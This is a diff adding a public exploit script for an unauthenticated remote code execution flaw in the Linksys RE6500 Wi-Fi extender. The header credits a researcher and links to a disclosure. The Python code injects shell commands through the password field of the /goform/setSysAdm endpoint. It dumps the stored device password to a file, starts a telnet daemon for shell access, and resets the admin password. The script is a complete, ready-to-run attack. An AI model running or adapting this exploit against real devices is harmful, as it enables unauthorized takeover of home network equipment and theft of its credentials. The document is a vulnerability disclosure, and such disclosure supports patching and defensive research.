@@ -1,0 +1,54 @@
+# Exploit Title: Linksys RE6500 1.0.11.001 - Unauthenticated RCE
+# Date: 31/07/2020
+# Exploit Author: RE-Solver
+# Public disclosure: https://resolverblog.blogspot.com/2020/07/linksys-re6500-unauthenticated-rce-full.html#4
+# Vendor Homepage: www.linksys.com
+# Version:  FW V1.05 up to FW v1.0.11.001
+# Tested on: FW V1.05 up to FW v1.0.11.001
+# Linksys RE6500 V1.0.05.003 and newer - Unauthenticated RCE
+# Unsanitized user input in the web interface for Linksys WiFi extender RE6500 allows Unauthenticated remote command execution. 
+# An attacker can access system OS configurations and commands that are not intended for use beyond the web UI. 
+
+#!/usr/bin/env python
+
+from requests import Session
+import requests
+import os
+print("Linksys RE6500, RE6500 - Unsanitized user input allows Unauthenticated remote command execution.")
+print("Tested on FW V1.05 up to FW v1.0.11.001")
+print("RE-Solver @solver_re")
+ip="192.168.1.226"
+
+command="nvram_get Password >/tmp/lastpwd"
+#save device password;
+post_data="admuser=admin&admpass=;"+command+";&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"
+url_codeinjection="http://"+ip+"/goform/setSysAdm"
+s = requests.Session()
+s.headers.update({'Origin': "http://"+ip})
+s.headers.update({'Referer': "http://"+ip+"/login.shtml"})
+
+r= s.post(url_codeinjection, data=post_data)
+if r.status_code == 200:
+    print("[+] Prev password saved in /tmp/lastpwd")
+
+command="busybox telnetd"
+#start telnetd;
+post_data="admuser=admin&admpass=;"+command+";&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"
+url_codeinjection="http://"+ip+"/goform/setSysAdm"
+s = requests.Session()
+s.headers.update({'Origin': "http://"+ip})
+s.headers.update({'Referer': "http://"+ip+"/login.shtml"})
+
+r=s.post(url_codeinjection, data=post_data)
+if r.status_code == 200:
+    print("[+] Telnet Enabled")
+
+#set admin password
+post_data="admuser=admin&admpass=0000074200016071000071120003627500015159&confirmadmpass=admin&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"
+url_codeinjection="http://"+ip+"/goform/setSysAdm"
+s = requests.Session()
+s.headers.update({'Origin': "http://"+ip})
+s.headers.update({'Referer': "http://"+ip+"/login.shtml"})
+r=s.post(url_codeinjection, data=post_data)
+if r.status_code == 200:
+    print("[+] Prevent corrupting nvram - set a new password= admin")
